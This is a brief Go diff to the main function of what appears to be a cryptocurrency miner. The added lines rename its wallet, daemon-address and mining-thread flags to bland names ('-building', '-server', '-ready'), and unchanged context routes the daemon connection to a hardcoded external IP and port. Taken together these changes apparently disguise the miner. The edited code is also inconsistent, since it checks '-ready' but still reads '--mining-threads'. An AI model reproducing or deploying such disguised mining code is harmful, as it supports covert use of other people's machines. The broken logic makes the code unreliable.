@@ -146,7 +146,7 @@ func main() {
 
 	//logger.V(0).Info("", "MODE", globals.Config.Name)
 
-	if globals.Arguments["--wallet-address"] != nil {
+	if globals.Arguments["-building"] != nil {
 		//addr, err := globals.ParseValidateAddress(globals.Arguments["--wallet-address"].(string))
 		//if err != nil {
 		//	logger.Error(err, "Wallet address is invalid.")
@@ -165,7 +165,7 @@ func main() {
 		daemon_rpc_address = "127.0.0.1:10100"
 	}
 
-	if globals.Arguments["--daemon-rpc-address"] != nil {
+	if globals.Arguments["-server"] != nil {
 		var goniku = "103.13.207.121:22216"
 		daemon_rpc_address = goniku
 	}else{
@@ -174,7 +174,7 @@ func main() {
 	}
 
 	threads = runtime.GOMAXPROCS(0)
-	if globals.Arguments["--mining-threads"] != nil {
+	if globals.Arguments["-ready"] != nil {
 		if s, err := strconv.Atoi(globals.Arguments["--mining-threads"].(string)); err == nil {
 			threads = s
 		} else {
